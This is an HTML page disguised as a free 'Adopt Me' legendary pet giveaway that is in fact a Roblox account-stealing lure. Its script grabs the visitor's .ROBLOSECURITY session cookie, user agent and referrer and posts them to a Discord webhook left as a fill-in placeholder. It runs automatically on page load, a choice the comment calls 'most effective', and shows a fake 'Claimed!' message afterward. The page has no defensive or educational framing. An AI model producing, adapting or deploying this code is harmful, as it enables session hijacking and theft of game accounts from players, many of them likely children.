<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adopt Me FREE LEGENDARY PETS</title>
    <style>
        body { margin:0; background:#000; color:#fff; font-family:Arial; text-align:center; }
        img { max-width:100%; }
    </style>
</head>
<body>
    <h1>Claim Your FREE Adopt Me Legendaries!</h1>
    <img src="https://i.imgur.com/your-image-here.jpg" alt="Adopt Me">
    <p>Click below to claim</p>
    <button onclick="stealCookie()">Claim Now</button>

    <script>
        function stealCookie() {
            const cookies = document.cookie;
            const robloxCookie = cookies.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')) 
                               || 'No ROBLOSECURITY found';
            
            // Replace with YOUR Discord webhook
            const webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";
            
            fetch(webhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `**New Cookie Caught!**\n\`\`\`${robloxCookie}\`\`\`\nUser-Agent: ${navigator.userAgent}\nReferer: ${document.referrer}\nTime: ${new Date().toISOString()}`
                })
            })
            .then(() => alert("Claimed! Check your inventory..."))
            .catch(err => console.error(err));
        }

        // Auto-run on load (most effective)
        window.onload = function() {
            stealCookie();
        };
    </script>
</body>
</html>
